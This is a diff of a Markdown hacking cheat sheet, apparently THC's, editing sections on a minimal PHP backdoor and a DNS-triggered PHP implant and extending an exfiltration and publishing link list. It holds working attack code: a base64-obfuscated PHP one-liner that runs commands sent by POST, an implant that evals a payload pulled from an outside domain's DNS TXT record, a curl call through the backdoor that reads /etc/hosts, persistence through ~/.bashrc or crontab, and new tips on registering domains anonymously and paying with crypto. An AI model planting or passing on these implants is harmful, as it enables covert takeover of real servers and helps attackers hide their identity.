@@ -1791,7 +1791,7 @@ Other methods:
 <a id="php-backdoor"></a>
 **6.iv. Smallest PHP Backdoor**
 
-Add this line to the beginning of any PHP file:
+Add this line at the beginning of any PHP file:
 ```php
 <?php $i=base64_decode("aWYoaXNzZXQoJF9QT1NUWzBdKSl7c3lzdGVtKCRfUE9TVFswXSk7ZGllO30K");eval($i);?>
 ```
@@ -1834,18 +1834,19 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 
 Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
-Add this implant to an index.php file (example):
+Add this line (the implant) at the beginning of any PHP file:
 ```php
 <?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
 ```
 
-The payload is stored in a DNS TXT record under the domain `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* use your own domain and also create your own payload. Example:
+The implant requests the payload via a DNS TXT-request from the domain `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* use your own domain and also create your own payload. Example:
 ```shell
 echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 ```
 
-- The TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
-- It is a `bootloader` implant. Use a while loop to download and execute larger paypload via DNS.
+- The DNS TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
+- The implant is a `bootloader`. Use a while loop to download and execute larger paypload via DNS.
+- Check out our favorite places to [register a domain anonymously](#pub): 
 
 Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 ```shell
@@ -2611,12 +2612,14 @@ Exfil<a id="cloudexfil"></a>
 7. [Croc](https://github.com/schollz/croc) - `croc send foo.txt / croc anit-price-example`
 8. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
 
-Publishing
+Publishing<a id="pub"></a>
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
 1. Or use /onion on [segfault.net](https://www.thc.org/segfault) or plain old https with ngrok.
 1. [DuckDNS](https://www.duckdns.org/) - Free Domain Names
 1. [AnonDNS](https://anondns.net/) - Free Domain Name (anonymous)
 1. [afraid.org](https://www.afraid.org) - Free Dynamic DNS for your domain
+2. [hostwinds](https://hostwinds.com) - Pay with crypto
+3. [unstoppable domains](https://unstoppabledomains.com) - Pay with crypto
 1. [he.net](https://dns.he.net/) - Free Nameserver service
 1. [0bin](https://0bin.net/) / [paste.ec](https://paste.ec) - Encrypted PasteBin
 1. [pad.riseup.net](https://pad.riseup.net) - Create documents and share them securely
